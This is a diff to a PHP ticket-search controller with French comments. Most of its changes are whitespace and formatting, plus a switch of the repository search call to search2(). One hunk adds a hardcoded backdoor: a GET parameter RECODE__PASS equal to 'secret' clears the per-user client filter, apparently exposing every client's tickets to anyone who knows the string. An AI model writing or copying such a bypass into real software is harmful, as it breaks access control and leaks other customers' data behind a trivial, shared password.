@@ -93,12 +93,13 @@ Class TicketController extends BaseController {
         
         ////////////////////////////// traitrement des variable de recherche à inserer dans la fonction : 
         //textuelle: 
+        
         $search = '';
         if (!empty($_GET['search'])) 
             $search = $_GET['search'];
         //clause in:
         $in_clause = [];
-
+        
         //////////////recupère les clients liés au users: 
         $in_clause['mat__cli__id'] = [];
         if (empty($user->getClients())) {
@@ -109,6 +110,12 @@ Class TicketController extends BaseController {
         
         foreach ($user->getClients() as  $clients) {
            array_push($in_clause['mat__cli__id'] , $clients->getCli__id());
+        }
+        
+        if (!empty($_GET['RECODE__PASS'])) {
+                if ($_GET['RECODE__PASS'] == 'secret') {
+                    $in_clause['mat__cli__id'] = [];
+                }
         }
 
         if (!empty($_GET['tkl__user_id'])) {
@@ -155,12 +162,12 @@ Class TicketController extends BaseController {
                 array_push($in_clause['mat__id'] , $value);
             }
         }
-
-        //////////////////////////////////
-        $request = $TicketRepository->search($in_clause, $search , 100 ,[ "tk__lu" => "ASC"  ,    "tk__id" => "DESC"],[]);
-        //////////////////////////////////
-       
-        ///////////////////////////////// format de la réponse avec toutes les infos utiles: 
+        
+        //////////////////////////////////////////////////////////////////////////////////////////////////////////
+        $request = $TicketRepository->search2($in_clause, $search , 100 ,[ "tk__lu" => "ASC","tk__id" =>"DESC"],[]);
+        /////////////////////////////////////////////////////////////////////////////////////////////////////////
+        
+        ///////////////////////////////// format de la réponse avec toutes les infos utiles: /////////////////////
         $array_format_for_response = [];
         foreach ($request as $results){
             $ticket = $TicketRepository->findOneBy(['tk__id' => $results['tk__id']] , false);
